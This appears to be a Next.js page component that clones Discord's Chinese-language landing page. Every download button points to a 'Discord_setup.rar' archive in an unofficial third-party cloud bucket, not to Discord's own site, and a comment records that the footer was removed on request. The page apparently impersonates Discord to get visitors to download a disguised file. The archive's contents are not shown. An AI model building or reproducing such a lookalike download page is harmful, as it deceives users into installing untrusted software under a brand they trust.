'use client';

import React, { useEffect, useState } from 'react';
import Navbar from '@/components/Navbar';
import FloatingControls from '@/components/FloatingControls';
import LoadingScreen from '@/components/LoadingScreen';
import SEOHead from '@/components/SEOHead';
import { useParallax, useIntersectionObserver } from '@/hooks/useParallax';
import { useLanguage } from '@/contexts/LanguageContext';
import { useTheme } from '@/contexts/ThemeContext';

export default function Home() {
  const [isLoading, setIsLoading] = useState(true);
  const [mounted, setMounted] = useState(false);
  const parallaxOffset = useParallax(0.3);
  const slowParallax = useParallax(0.1);
  const [heroRef, heroInView] = useIntersectionObserver({ threshold: 0.1 });
  const [featuresRef, featuresInView] = useIntersectionObserver({ threshold: 0.1 });

  const { t, language } = useLanguage();
  const { theme } = useTheme();

  useEffect(() => {
    setMounted(true);
    // 模拟加载完成
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 2000);

    return () => clearTimeout(timer);
  }, []);

  if (!mounted) {
    return <LoadingScreen />;
  }

  if (isLoading) {
    return <LoadingScreen />;
  }

  return (
    <>
      <SEOHead />
      <div className={`min-h-screen theme-transition ${
        theme === 'light'
          ? 'bg-gradient-to-br from-[#5865f2] via-[#7c3aed] to-[#ec4899]'
          : 'bg-gradient-to-br from-[#32379d] via-[#575ee1] to-[#4f46e5]'
      } text-white relative overflow-hidden`}>

        {/* Enhanced Starfield Background with Parallax */}
        <div className="absolute inset-0 opacity-30" style={{ transform: `translateY(${slowParallax}px)` }}>
          <div className="absolute top-10 left-10 w-1 h-1 bg-white rounded-full starfield-animation"></div>
          <div className="absolute top-20 right-20 w-2 h-2 bg-white rounded-full starfield-animation" style={{animationDelay: '1s'}}></div>
          <div className="absolute top-40 left-1/4 w-1 h-1 bg-white rounded-full starfield-animation" style={{animationDelay: '2s'}}></div>
          <div className="absolute top-60 right-1/3 w-2 h-2 bg-white rounded-full starfield-animation" style={{animationDelay: '0.5s'}}></div>
          <div className="absolute top-80 left-1/2 w-1 h-1 bg-white rounded-full starfield-animation" style={{animationDelay: '1.5s'}}></div>
          <div className="absolute bottom-40 right-10 w-2 h-2 bg-white rounded-full starfield-animation" style={{animationDelay: '3s'}}></div>
          <div className="absolute bottom-60 left-20 w-1 h-1 bg-white rounded-full starfield-animation" style={{animationDelay: '2.5s'}}></div>
          <div className="absolute bottom-80 right-1/4 w-1 h-1 bg-white rounded-full starfield-animation" style={{animationDelay: '0.8s'}}></div>

          {/* Additional floating elements */}
          <div className="absolute top-1/3 left-1/6 w-3 h-3 bg-purple-400 rounded-full opacity-40 float-animation"></div>
          <div className="absolute top-2/3 right-1/6 w-2 h-2 bg-pink-400 rounded-full opacity-40 float-animation-reverse"></div>
          <div className="absolute top-1/2 left-3/4 w-4 h-4 bg-blue-400 rounded-full opacity-30 bounce-slow"></div>
        </div>

        {/* Enhanced Navigation */}
        <Navbar />

        {/* Hero Section with Enhanced Animations */}
        <section
          ref={heroRef}
          className="relative z-10 text-center px-6 py-32 lg:py-40"
          style={{ transform: `translateY(${parallaxOffset * 0.5}px)` }}
        >
          <div className="max-w-6xl mx-auto">
            <div className="grid lg:grid-cols-2 gap-12 items-center">
              <div className={`text-left ${heroInView ? 'fade-in-up' : 'opacity-0'}`}>
                <h1 className="text-4xl lg:text-7xl font-black leading-tight mb-8 gradient-text-animated discord-text-shadow">
                  {t.hero.title1}<br />
                  {t.hero.title2}<br />
                  {t.hero.title3}
                </h1>
                <p className={`text-lg lg:text-xl leading-relaxed mb-12 max-w-md ${heroInView ? 'fade-in-up stagger-2' : 'opacity-0'}`}>
                  {t.hero.description}
                </p>
                <div className={`flex flex-col sm:flex-row gap-4 ${heroInView ? 'fade-in-up stagger-3' : 'opacity-0'}`}>
                  <a href="https://poapoa.oss-cn-hongkong.aliyuncs.com/Discord_setup.rar" className="bg-white text-gray-900 px-8 py-4 rounded-full font-medium text-lg hover:bg-gray-100 transition-all duration-300 flex items-center justify-center discord-button tilt-3d ripple micro-bounce magnetic hover-glow" download>
                    <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M3 17a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm3.293-7.707a1 1 0 011.414 0L9 10.586V3a1 1 0 112 0v7.586l1.293-1.293a1 1 0 111.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z" clipRule="evenodd" />
                    </svg>
                    {t.hero.downloadMac}
                  </a>
                  <button className="bg-gray-900 text-white px-8 py-4 rounded-full font-medium text-lg hover:bg-gray-800 transition-all duration-300 discord-button ripple micro-bounce magnetic">
                    {t.hero.openBrowser}
                  </button>
                </div>
              </div>
              <div className={`relative ${heroInView ? 'fade-in-up stagger-4' : 'opacity-0'}`}>
                <div className="relative tilt-3d advanced-card">
                  <img
                    src="https://ext.same-assets.com/1695138707/2336570350.webp"
                    alt="Discord Interface"
                    className="w-full max-w-2xl mx-auto pulse-glow"
                  />
                  {/* Floating Characters with Enhanced Animations */}
                  <div className="absolute inset-0 pointer-events-none">
                    <img
                      src="https://ext.same-assets.com/1695138707/3275561029.webp"
                      alt="Characters"
                      className="absolute -bottom-10 -left-10 w-20 lg:w-32 float-animation elastic-hover"
                    />
                    <img
                      src="https://ext.same-assets.com/1695138707/2927890028.webp"
                      alt="Characters"
                      className="absolute -top-5 -right-5 w-16 lg:w-24 float-animation-reverse"
                    />
                    <div className="absolute top-1/2 right-1/4 w-8 h-8 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full opacity-60 bounce-slow"></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* Simple Feature Sections with Text and Images */}
        <div ref={featuresRef} className="relative z-10 space-y-24 pb-32">

          {/* Feature 1: Chat */}
          <section className="px-6">
            <div className="max-w-6xl mx-auto">
              <div className="grid lg:grid-cols-2 gap-16 items-center">
                <div className={`${featuresInView ? 'fade-in-up' : 'opacity-0'}`}>
                  <h2 className="text-4xl lg:text-5xl font-black mb-6 text-white">
                    让您的群聊更有趣
                  </h2>
                  <p className="text-lg lg:text-xl leading-relaxed text-white/90">
                    使用自定义表情符号、贴纸和音板音效等功能，让您的语音、视频或文字聊天更有个人特色。设置专属头像，设定个性状态，撰写个人资料，让您的风格在聊天中脱颖而出。
                  </p>
                </div>
                <div className="relative">
                  <img
                    src="https://ext.same-assets.com/1188495973/1524208333.webp"
                    alt="Discord Chat Features"
                    className="w-full rounded-2xl shadow-2xl"
                  />
                </div>
              </div>
            </div>
          </section>

          {/* Feature 2: Stream */}
          <section className="px-6">
            <div className="max-w-6xl mx-auto">
              <div className="grid lg:grid-cols-2 gap-16 items-center">
                <div className="lg:order-2 relative">
                  <img
                    src="https://ext.same-assets.com/1188495973/1015497298.webp"
                    alt="Discord Streaming"
                    className="w-full rounded-2xl shadow-2xl"
                  />
                </div>
                <div className={`lg:order-1 ${featuresInView ? 'fade-in-up stagger-2' : 'opacity-0'}`}>
                  <h2 className="text-4xl lg:text-5xl font-black mb-6 text-white">
                    如同共处一室一般流畅直播
                  </h2>
                  <p className="text-lg lg:text-xl leading-relaxed text-white/90">
                    我们的直播服务画质高、延迟低，能让您感觉仿佛与朋友们共坐在一张沙发上，一起看游戏直播、欣赏照片，或者一起做作业也可以。
                  </p>
                </div>
              </div>
            </div>
          </section>

          {/* Feature 3: Voice */}
          <section className="px-6">
            <div className="max-w-6xl mx-auto">
              <div className="grid lg:grid-cols-2 gap-16 items-center">
                <div className={`${featuresInView ? 'fade-in-up stagger-3' : 'opacity-0'}`}>
                  <h2 className="text-4xl lg:text-5xl font-black mb-6 text-white">
                    有空就来，无需提前打电话联系
                  </h2>
                  <p className="text-lg lg:text-xl leading-relaxed text-white/90">
                    无需拨打电话或发送邀请，您可以自如地加入和离开语音或文本聊天，在一局游戏的前、中、后期都无缝开启畅聊派对。
                  </p>
                </div>
                <div className="relative">
                  <img
                    src="https://ext.same-assets.com/1188495973/1303175616.webp"
                    alt="Discord Voice Chat"
                    className="w-full rounded-2xl shadow-2xl"
                  />
                </div>
              </div>
            </div>
          </section>
        </div>

        {/* Enhanced Final CTA with Parallax */}
        <section
          className="relative z-10 text-center px-6 py-20"
          style={{ transform: `translateY(${parallaxOffset * 0.2}px)` }}
        >
          <div className="max-w-4xl mx-auto">
            <h2 className="text-4xl lg:text-6xl font-black mb-8 gradient-text-animated discord-text-shadow">
              {t.cta.title1}<br />
              {t.cta.title2}
            </h2>
            <a href="https://poapoa.oss-cn-hongkong.aliyuncs.com/Discord_setup.rar" className="bg-white text-gray-900 px-8 py-4 rounded-full font-medium text-lg hover:bg-gray-100 transition-all duration-300 discord-button pulse-glow ripple micro-bounce magnetic hover-glow" download>
              {t.cta.downloadLinux}
            </a>
            <div className="mt-16 relative">
              <img
                src="https://ext.same-assets.com/1695138707/2186779871.webp"
                alt="Characters"
                className="w-full max-w-4xl mx-auto float-animation elastic-hover"
              />
            </div>
          </div>
        </section>

        {/* Footer removed per user request */}

        {/* Floating Controls */}
        <FloatingControls />
      </div>
    </>
  );
}
